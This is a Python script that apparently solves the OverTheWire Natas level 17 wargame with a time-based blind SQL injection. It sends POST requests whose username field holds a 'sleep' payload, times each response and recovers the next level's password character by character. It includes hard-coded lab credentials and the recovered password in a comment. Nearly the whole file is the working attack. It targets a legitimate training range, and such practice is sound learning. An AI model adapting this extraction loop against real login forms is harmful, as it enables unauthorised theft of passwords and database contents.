import requests
from requests.auth import HTTPBasicAuth
import string
import urllib
authentication = HTTPBasicAuth('natas17', 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd')
headers = {'content-type':'application/x-www-form-urlencoded'}
filteredchars=''
passwd = ''
allchars = string.ascii_letters + string.digits

# payload = urllib.parse.quote('natas18\" and sleep(5); #')
# payload = 'username=' + payload
# print(payload)

password = ''
for i in range(1,33):
    for chr in allchars:
        payload = 'username=' + urllib.parse.quote('natas18\" and BINARY substring(password,1,'+str(i)+')=\''+password+chr+'\' and sleep(2); #')
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth = authentication, headers = headers, data=payload)  

        if r.elapsed.seconds > 1:
            password += chr
            print(password)
            break


# password_final = '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq'
